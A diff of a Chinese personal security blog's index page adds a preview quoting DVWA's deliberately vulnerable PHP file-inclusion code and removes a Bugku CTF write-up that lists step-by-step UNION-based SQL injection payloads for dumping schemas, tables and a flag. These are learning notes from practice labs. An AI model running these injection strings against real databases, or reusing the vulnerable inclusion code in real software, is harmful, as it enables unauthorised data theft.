@@ -148,6 +148,84 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-15文件包含漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/unln1999.github.io/2019/10/25/15文件包含漏洞/">php文件包含漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/unln1999.github.io/2019/10/25/15文件包含漏洞/" class="archive-article-date">
+  	<time datetime="2019-10-24T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-25</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>直接从DVWA源码开始看起：</p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// The page we wish to display </span><br><span class="line">$file = $_GET[ &apos;page&apos; ]; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// The page we wish to display </span><br><span class="line">$file = $_GET[ &apos;page&apos; ]; </span><br><span class="line"></span><br><span class="line">// Input validation </span><br><span class="line">$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file ); </span><br><span class="line">$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file ); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// The page we wish to display </span><br><span class="line">$file = $_GET[ &apos;page&apos; ]; </span><br><span class="line"></span><br><span class="line">// Input validation </span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123; </span><br><span class="line">    // This isn&apos;t the page we want! </span><br><span class="line">    echo &quot;ERROR: File not found!&quot;; </span><br><span class="line">    exit; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/unln1999.github.io/2019/10/25/15文件包含漏洞/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-buu1-随便注" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1021,108 +1099,9 @@
 
 
   
-    <article id="post-bk20-成绩单" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/unln1999.github.io/2019/10/08/bk20-成绩单/">Bugku 2019/10/8 成绩单</a>
-    </h1>
-  
-
-        
-        <a href="/unln1999.github.io/2019/10/08/bk20-成绩单/" class="archive-article-date">
-  	<time datetime="2019-10-07T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="进入题目页面"><a href="#进入题目页面" class="headerlink" title="进入题目页面"></a>进入题目页面</h2><p>显然是sql注入</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><ol>
-<li><p>输入1’，输出不正常，1’#,输出正常。应该是字符型输出。</p>
-</li>
-<li><p>输入1’ or 1# 只输出一个，可见输出受限。</p>
-</li>
-<li><p>输入一个没有数据的id，在用union select暴库。</p>
-</li>
-<li><p>输入4’ union select 1,2,3,4#<br>（1、2、3、4是一个个试过来的，得到字段数，用order by 报错被抑制）</p>
-</li>
-<li><p>输入4’ union select database(),2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#<br>得到数据库中的表。</p>
-</li>
-<li><p>输入4’ union select database(),2,3,group_concat(column_name) from information_schema.columns where table_name=’fl4g’#</p>
-</li>
-<li><p>输入4’ union select database(),2,3,group_concat(skctf_flag) from skctf_flag.fl4g#<br>得到flag。</p>
-</li>
-</ol>
-<p>附：暴库 4’ union select database(),2,3,group_concat(schema_name) from information_schema.schemata#</p>
-<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ol>
-<li><strong>SQL注入</strong></li>
-<li><strong>group_concat</strong></li>
-<li><strong>暴库、暴表、暴字段</strong></li>
-<li><strong>information_schema.schemata</strong></li>
-<li><strong>information_schema.tables where table_schema=’’</strong></li>
-<li><strong>information_schema.columns where table_name=’’</strong></li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">bugku</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/unln1999.github.io/2019/10/08/bk20-成绩单/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/unln1999.github.io/page/2/">2</a><a class="page-number" href="/unln1999.github.io/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/unln1999.github.io/page/5/">5</a><a class="extend next" rel="next" href="/unln1999.github.io/page/2/">Next &raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/unln1999.github.io/page/2/">2</a><a class="page-number" href="/unln1999.github.io/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/unln1999.github.io/page/6/">6</a><a class="extend next" rel="next" href="/unln1999.github.io/page/2/">Next &raquo;</a>
     </nav>
   
 
@@ -1250,10 +1229,6 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">电路</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">网站</a>
               </li>
              
@@ -1266,6 +1241,10 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">模电</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">buuctf</a>
               </li>
              
@@ -1274,11 +1253,11 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">模电</a>
+                <a href="javascript:void(0)" class="js-tag color3">复变</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">复变</a>
+                <a href="javascript:void(0)" class="js-tag color3">电路</a>
               </li>
             
             <div class="clearfix"></div>
